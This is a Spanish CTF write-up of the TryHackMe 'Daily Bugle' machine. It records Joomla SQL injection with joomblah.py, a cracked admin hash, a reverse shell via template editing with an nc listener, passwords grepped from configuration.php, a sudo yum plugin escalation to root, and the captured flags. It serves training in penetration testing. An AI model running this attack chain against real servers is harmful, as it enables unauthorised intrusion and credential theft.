---
Titulo: Daily Bugle
Fecha: 03-11-2025
categoria: []
Dificultad_oficial: Dificil
Dificultad_percibida: Facil/Medio
Estado: Terminado
---
## 1. Descripción del reto
La descripción oficial del reto es: "Comprometa una cuenta de Joomla CMS mediante SQLi, practique el descifrado de hashes y escale sus privilegios aprovechando yum.", por lo que parece que vamos a practicar SQLi y escalada de privilegios, vamos a ver que nos encontramos esta vez.

## 2. Enumeración / Reconocimiento
```shell
root@ip-10-10-196-199:~# nmap -sS -Pn -sV --open --min-rate 5000 10.10.130.240
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-03 12:59 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.130.240
Host is up (0.00093s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
MAC Address: 02:92:D1:CA:EC:5B (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.90 seconds
```

```shell
root@ip-10-10-196-199:~# gobuster dir -u http://10.10.130.240 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.130.240
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/media                (Status: 301) [Size: 235] [--> http://10.10.130.240/media/]
/templates            (Status: 301) [Size: 239] [--> http://10.10.130.240/templates/]
/modules              (Status: 301) [Size: 237] [--> http://10.10.130.240/modules/]
/images               (Status: 301) [Size: 236] [--> http://10.10.130.240/images/]
/index.php            (Status: 200) [Size: 9280]
/bin                  (Status: 301) [Size: 233] [--> http://10.10.130.240/bin/]
/plugins              (Status: 301) [Size: 237] [--> http://10.10.130.240/plugins/]
/includes             (Status: 301) [Size: 238] [--> http://10.10.130.240/includes/]
/language             (Status: 301) [Size: 238] [--> http://10.10.130.240/language/]
/README.txt           (Status: 200) [Size: 4494]
/components           (Status: 301) [Size: 240] [--> http://10.10.130.240/components/]
/cache                (Status: 301) [Size: 235] [--> http://10.10.130.240/cache/]
/libraries            (Status: 301) [Size: 239] [--> http://10.10.130.240/libraries/]
/robots.txt           (Status: 200) [Size: 836]
/tmp                  (Status: 301) [Size: 233] [--> http://10.10.130.240/tmp/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 301) [Size: 237] [--> http://10.10.130.240/layouts/]
/administrator        (Status: 301) [Size: 243] [--> http://10.10.130.240/administrator/]
/configuration.php    (Status: 200) [Size: 0]
/htaccess.txt         (Status: 200) [Size: 3005]
/cli                  (Status: 301) [Size: 233] [--> http://10.10.130.240/cli/]
/.html                (Status: 403) [Size: 207]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

## 3. Explotación / Desarrollo
```shell
root@ip-10-10-196-199:~# python joomblah.py http://10.10.130.240/
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Contraseña: spiderman123

10.10.254.207

shell con templeates+reverse shell (Pentest monkey)

![[Pasted image 20251103183545.png]]

```shell
──(kali㉿Odon)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

bash-4.2$ ls /home
jjameson
bash-4.2$ cat /var/www/html/configuration.php | grep pass*
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $ftp_pass = '';
        public $smtppass = '';
bash-4.2$ su jjameson
Password: 
[jjameson@dailybugle /]$ ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
[jjameson@dailybugle /]$ whoami
jjameson
```

```shell
[jjameson@dailybugle /]$ TF=$(mktemp -d)
[jjameson@dailybugle /]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle /]$ 
[jjameson@dailybugle /]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle /]$ 
[jjameson@dailybugle /]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle /]$ 
[jjameson@dailybugle /]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whomai
sh: whomai: command not found
sh-4.2# whoami
root
sh-4.2# cat /home/jjameson/  
.bash_history  .bash_logout   .bash_profile  .bashrc        user.txt
sh-4.2# cat /home/jjameson/user.txt                
27a260fe3cba712cfdedb1c86d80442e
sh-4.2# ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
sh-4.2# cat /home/jjameson/user.txt /root/root.txt 
27a260fe3cba712cfdedb1c86d80442e
eec3d53292b1821868266858d7fa6f79
```

## 3. Notas y aprendizajes

- Punto fuerte: ...
    
- Dificultad encontrada: ...
    
- Conceptos nuevos aprendidos: ...
- 